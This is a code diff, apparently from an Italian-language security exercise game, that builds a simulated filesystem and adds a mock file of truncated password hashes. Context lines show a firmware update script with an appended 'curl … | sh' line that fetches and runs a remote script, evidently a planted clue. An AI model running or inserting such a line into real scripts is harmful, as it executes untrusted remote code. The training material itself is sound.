@@ -297,6 +297,18 @@ export function buildWorld(user: string, hint?: () => string | null): Shell {
   firmware['update.sh'] += 'curl -s http://203.0.113.77/x.sh | sh\n';
   for (const [n, c] of Object.entries(firmware)) fs.writeFile(`${cripto}/firmware/${n}`, c, mine);
   fs.writeFile(`${cripto}/firmware/SHA256SUMS`, sums + '\n', mine);
+  // capitolo 06.3: come il vecchio server conservava le password (solo il prefisso conta per l'esercizio)
+  fs.writeFile(
+    `${cripto}/hash-account.txt`,
+    [
+      '# Copia per l\'audit: utente e formato dell\'impronta della password (valori accorciati)',
+      'mama:$y$j9T$k3Lq...$Wv0p...',
+      'jackie:$y$j9T$a81Z...$Qe7t...',
+      'luca:$6$Rt2n...$p9Xc...',
+      'cassa:$1$x8Kd...$m1Fq...',
+    ].join('\n') + '\n',
+    mine,
+  );
 
   // Capitolo 07 — sito del jukebox
   fs.writeFile(`${home}/web/access.log`, buildAccessLog(), mine);
